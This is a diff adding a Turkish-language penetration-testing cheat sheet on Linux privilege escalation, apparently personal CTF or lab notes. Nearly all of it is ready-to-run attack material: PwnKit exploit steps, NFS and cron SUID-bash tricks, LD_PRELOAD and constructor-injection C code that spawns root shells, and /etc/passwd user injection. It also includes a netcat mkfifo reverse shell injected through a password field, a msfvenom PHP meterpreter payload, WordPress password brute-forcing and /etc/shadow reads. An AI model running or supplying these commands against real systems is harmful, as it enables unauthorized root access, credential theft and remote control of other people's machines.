@@ -1,0 +1,200 @@
+#"Privesc-Ricki"
+Yetki yükseltme aşamaları için Omuz sörfü vs görürsen ilk deneyeceğin nokta
+sudo -i olmalıdır.
+----
+İlk önce nmap ile tarayıp, SSH ile sunucuya girmelisin.
+#Örnek Pkexec
+Pwnkit CVE-2021-4034
+cd /tmp
+git clone https://.../CVE
+make
+./cve-2021....
+you root
+----
+"nfscommonprivesc"
+nfscommon yetki yükseltme
+ilk önce SSH ile sunucuya bağlan,
+
+nmap -sV -p 2049 IP/24
+sudo apt-get install nfs-common
+showmount -e Target_IP bunun sonucunda dizinler gözükür.
+nmap -sV --script=nfs-showmount Target IP -> Check edebilirsin.
+mdkir /tmp/nfs -> Kendi cihazında çalıştır.
+
+1.Yol
+sudo mount -t nfs IP/home /tmp/nfs -> Kendi cihazında yer alan /tmp/nfs'i karşı tarafa mount ettin
+sudo cp /bin/bash .
+sudo chmod +s bash
+
+ssh ubuntu@10.10.10.10
+cd home
+./bash -p
+-Root
+
+2.Yol
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf  
+chmod +s shell.elf
+ssh sonrası ./shell.elf ile çalıştır. Root'sun
+find / -name "a.txt"
+
+----
+Harici Privesc yöntemleri
+
+find / -perm /4000 2>/dev/null -> Komutu ile root yetkisi ile çalışan araçları görüntüleyebilirim.
+Find aracı root olarak kullanılıyorsa ;
+find . -exec '/bin/bash' \; komutu ile root olunabilir.
+---
+-Cp komutunu root olarak çalıştırabilirsen Shadow dosyalarını
+"cp shadow /tmp" komutu ile tmp dizinine kopyala.
+Johntheripper aracı ile hash kırma denemesi yapabilirim.
+----
+/Etc içerisinde bulunan crontab ile sürekli çalıştırılan programlar üzerinde işlem gerçekleştirebilirim.
+--
+/etc/passwd içerisine erişim sağlayabilirsem burada ki kullanıcıları kopyala
+openssl passwd -1 -salt kali 123456 düzeninde bir kullanıcı ekle
+Burada hashli halini kopyalıyorum.
+Python simplehttpserver ile oluşturduğum metni karşı tarafa aktarıyorum.
+wget http://192.168.139.176:4321/passwd ile tmp içersinie aktarıyorum.
+cp passwd /etc/passwd olarak kopyalıyorum.
+Eklenen kullanıcı ile giriş sağlıyorum.
+----------------------------------------------
+Php dosyası eklenmez ise php dosyası açılıp başına GIF98 ibaresi eklenebilir.
+----
+-------------------------------
+Spawning a shell throught python
+python -c 'import pty; pty.spawn("/bin/sh")'
+python -c 'import pty; pty.spawn("/bin/bash")'
+-------------------------------
+Find binaries that have suid bit set (root)
+find / -perm -u=s -type f 2>/dev/null
+-------------------------------
+Set what a user has on target with regards to permissions
+find /group [user] 2>/dev/null
+-------------------------------
+Find super users and what they can do
+cat /etc/sudoers
+-------------------------------
+https://gtfobins.github.io/gtfobins/nmap/
+Nmap ile root erişimi kazanma
+-------------------------------
+Bilgi toplama aşaması
+***********************
+/etc/shadow içerisinde kullanıcı adı ve şifreler bulunmaktadır.
+arp -a komutu ile mac adreslerini görebiliriz.
+ip route komutu ile yönlendirmeleri görebiliriz.
+locate password komutu ile şifrelerle ilgili bilgi sahibi olabiliriz.
+find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \. Bu komut ile tüm dosyaları tarayıp içerisinde password geçen kelimeleri görüntüleyebiliyoruz.
+find / -name password 2> /dev/null komutu ile içerisinde şifre geçen dizinleri görebiliriz.
+find / -name id_rsa 2> /dev/null komutu ile SSH bağlantısı kurmamıza olanak sağlar.
+history komutuna da bakarsak buradan bilgi alabiliriz.
+--------------------------------
+Hazır script indirip burada işlem yapıp yapamayacağımıza da bakmamız gerekmektedir.
+-Pentest aşamasında wget komutu var mı yok mu ona bakmamız gerekmektedir.Fakat bunun için network bağlantımız olmalıdır.
+Linux exploit suggester,Linpeas,Linenum araçlarını kullanarak işlem yapabiliriz.
+--------------------------------
+"sudo -l" komutu ile root kullanıcısı ile erişim sağlayabileceğimiz uygulamaları görüntülüyoruz.
+Burada komut çalıştırmak için sudo /usr/bin/vim -c '!/bin/sh' kullanılabilir.
+----
+#PRELOAD kütüphane ekleyerek root olma#
+
+#include <sys/types.h> #include <stdlib.h>
+
+void _init() { unsetenv("LD_PRELOAD");
+
+setgid(0);
+setuid(0); system("/bin/bash");
+
+}
+
+#include <stdio.h>
+------Bu kodu kullanarak eklediğimiz LD_PRELOAD ile erişim sağlayabiliriz.
+Save the file as x.c
+
+In command prompt type:
+
+gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
+
+In command prompt type:
+
+sudo LD_PRELOAD=/tmp/x.so apache2
+
+In command prompt type: id 
+-----------------------------
+#SUID Kullanarak erişim kazanma#
+chmod +s dosya_adi
+find / type f -perm -04000 -ls 2>/dev/null Komuut ile burada SUID yapabileceğimiz dosyaları görüntülenebilir.
+"strace /usr/local/bin/suid-so 2>&1 | more" komutu ile arka planda dönen işlemleri görüntülüyorum.
+-Burada bazı yerlerde "No such file or directroy" görüntülüyorum ve burada erişim engeline takıldığını görüntülüyorum.Buradan bir erişim alınabilir.
+strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file" komutu ile erişim alabileceğim yerleri görüntülüyorum.
+Ardından buradan bulunmayan dosyayı seçip onu oluşturuo içerisine bu kodu enjekte ediyorum.
+
+KOD KISMI
+#include <stdio.h> #include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+
+} 
+
+
+Save the file as libcalc.c
+In command prompt type:
+Kodu yazdıktan sonra alttaki komut ile derleme işlemi yapıyorum.
+gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
+Bu işlemin ardından kod eklediğim kısmı çalıştırıyorum ve root oluyorum.
+-------------------------------------
+##CRONTAB## 
+-Burada düzenli olarak çalışan programlar hakkında bilgi sahibi olmaktayız.
+-Burada ki yıldızların sayısına bağlı olarak "Crontab guru" aramasının ardından kaç dakikada bir çalışacağını görüntüleyebilirdik.
+-/etc/cron.d - /etc/crontab dizinlerinde bulunmaktadır.Burada bulunan dosyaların içerisine bir shell kodu gizleyip işlem gerçekleştirebiliriz.
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
+chmod +x /home/user/overwrite.sh
+Kopyalama işleminin ardından
+/tmp/bash -p
+Komutun çalıştırıp root oluyoruz.
+-------------------------------------
+#LFI İşlemlerini kontrol et İnit-14' Görsel#
+-------------------------------------
+https://github.com/swisskyrepo/PayloadsAllTheThings Buradan gerekli Payloadları deneyebiliriz.
+-------------------------------------
+#CURL Üzerinden istek atma#
+POST EKLEME (CURL)
+**curl -X POST 'http://10.52.164.17/users/register' -H 'Content-Type: application/json' -d '{"name": "JH", "username": "8754", "password": "@#!" , "email" : ""}'
+--------------------------------------
+Netcat dinleme Code Injection
+Burp üzerinden passwd kısmına ; ile eklenip yapılır.
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash 2>&1|nc 10.52.164.34 4444 >/tmp/f
+---------------------------------------
+/etc/passwd Kullanıcı ekleme
+perl -le 'print crypt("JH8754", "@#!")'
+Komutu ile hash değerini elde edebiliriz.
+Hash değerini root üzerinde ki gibi yazdıktan sonra
+echo "Komut" >> passwd komutu ile yazdırıyorum.
+------
+Wpscan üzerinden tarama gerçekleştirme
+wpscan --url https://10.0.2.5:12380/blogblog/ --disable-tls-checks --usernames john --passwords fasttrack.txt -t 100 --password-attack wp-login
+----------------------------------------
+MSFVENOM Shell oluşturma
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.2.4 LPORT=4343 -f raw > myshell.php
+----------------------------------------
+Linux Exploit Suggester
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | -O les.sh
+
+LinPeas
+curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
+
+LinEnum
+https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+-----------------------------------------
+nmap -p 445 --script=smb-enum-users.nse,smb-enum-shares.nse 10.10.99.173
+Nmap ile script taraması yapmak.
+Mount komutu ile tüm bilgileri kendimize indirebiliriz.
+---------------------------------------------
+NC bağlantısı üzerinde CPFR ve CPTO komutlarını kullanarak kopyalama işlemi gerçekleştirebliriz.
+---------------------------------------------
+Tail kütüphanesi tanımlıysa bu kod çalıştırılıp bilgi alınabilir.
+find / -perm -4000 2>/dev/null
+tail -c1G /etc/shadow
+---------------------------------------------
